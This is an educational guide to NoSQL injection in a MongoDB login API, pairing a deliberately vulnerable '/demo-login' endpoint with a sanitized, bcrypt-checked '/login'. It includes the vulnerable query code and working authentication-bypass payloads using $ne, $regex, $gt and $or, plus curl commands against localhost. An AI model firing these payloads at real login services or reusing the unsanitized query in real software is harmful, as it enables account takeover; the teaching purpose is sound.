# NoSQL Injection Demonstration Guide

This document demonstrates the NoSQL injection vulnerability and how to protect against it.

## ⚠️ WARNING
The `/demo-login` endpoint is **INTENTIONALLY VULNERABLE** for educational purposes only. 
**DO NOT USE IN PRODUCTION!**

---

## 1. Vulnerable Endpoint: `/api/auth/demo-login`

### Code Location
`backend/routes/auth.js` - Lines 79-133

### Vulnerability Explanation
The vulnerable endpoint directly injects user input into MongoDB queries without sanitization:

```javascript
// ⚠️ VULNERABLE CODE
const user = await User.findOne({
    email: email,      // Direct injection - no sanitization
    password: password // Direct injection - no hashing check
});
```

**Problem**: MongoDB accepts operators like `$ne`, `$gt`, `$regex`, etc. When user input is directly used in queries, attackers can inject these operators to manipulate the query logic.

---

## 2. Performing NoSQL Injection Attack

### Step 1: Use a REST client (Postman, Insomnia, or curl)

### Step 2: Send POST request to vulnerable endpoint

**Endpoint**: `POST http://localhost:5000/api/auth/demo-login`

**Headers**:
```
Content-Type: application/json
```

**Body (JSON)**:
```json
{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
```

### Step 3: Result
You will successfully log in **without providing valid credentials**!

The attack works because:
- `{ "$ne": null }` means "not equal to null"
- MongoDB finds the first user where email is not null AND password is not null
- Since all users have these fields, it matches the first user in the database
- Authentication is bypassed!

---

## 3. Secure Endpoint: `/api/auth/login`

### Code Location
`backend/routes/auth.js` - Lines 135-200

### Security Features

#### ✅ 1. Input Sanitization
```javascript
// Convert objects to strings to prevent operator injection
if (email && typeof email !== 'string') {
    sanitizedEmail = String(email);
}
```

**Protection**: If an attacker sends `{ "$ne": null }`, it gets converted to the string `"[object Object]"`, which won't match any user.

#### ✅ 2. Password Hashing Verification
```javascript
// Verify password using bcrypt
const isMatch = await bcrypt.compare(password, user.password);
```

**Protection**: Even if an attacker bypasses the email check, they still need the correct password hash, which is computationally infeasible to reverse.

#### ✅ 3. Explicit Validation
```javascript
if (!password) {
    return res.status(400).json({ message: 'Password is required' });
}
```

**Protection**: Ensures required fields are present and properly formatted.

---

## 4. Comparison Table

| Feature | Vulnerable `/demo-login` | Secure `/login` |
|---------|-------------------------|-----------------|
| Input Sanitization | ❌ None | ✅ Object → String coercion |
| Password Hashing | ❌ Direct comparison | ✅ bcrypt.compare() |
| Operator Injection | ❌ Vulnerable | ✅ Protected |
| Field Validation | ❌ Minimal | ✅ Explicit checks |

---

## 5. Testing the Secure Endpoint

Try the same attack on the secure endpoint:

**Endpoint**: `POST http://localhost:5000/api/auth/login`

**Body (JSON)**:
```json
{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
```

**Result**: ❌ Login fails with "Invalid credentials"

The secure endpoint converts `{ "$ne": null }` to the string `"[object Object]"`, which doesn't match any user's email.

---

## 6. Best Practices for Preventing NoSQL Injection

1. **Always sanitize input**: Convert objects to strings or use whitelist validation
2. **Use parameterized queries**: Let the ORM/ODM handle query construction
3. **Validate input types**: Ensure expected types (string, number, etc.)
4. **Use password hashing**: Never compare passwords directly
5. **Implement rate limiting**: Prevent brute force attacks
6. **Use MongoDB's built-in security**: Enable authentication and authorization
7. **Regular security audits**: Test for vulnerabilities regularly

---

## 7. Additional Attack Examples

### Example 1: Regex Injection
```json
{
  "email": { "$regex": ".*" },
  "password": { "$ne": null }
}
```

### Example 2: Greater Than Operator
```json
{
  "email": { "$gt": "" },
  "password": { "$gt": "" }
}
```

### Example 3: OR Operator
```json
{
  "$or": [
    { "email": "admin@example.com" },
    { "email": { "$ne": null } }
  ],
  "password": { "$ne": null }
}
```

**Note**: These attacks will work on `/demo-login` but will fail on `/login` due to input sanitization.

---

## 8. Demonstration Script

You can use this curl command to test the vulnerability:

```bash
# Vulnerable endpoint (will succeed)
curl -X POST http://localhost:5000/api/auth/demo-login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'

# Secure endpoint (will fail)
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
```

---

## Conclusion

This demonstration shows:
1. ✅ How NoSQL injection works
2. ✅ Why input sanitization is critical
3. ✅ How password hashing protects against attacks
4. ✅ The difference between vulnerable and secure code

**Remember**: Always use the secure `/login` endpoint in production. The `/demo-login` endpoint is for educational purposes only!

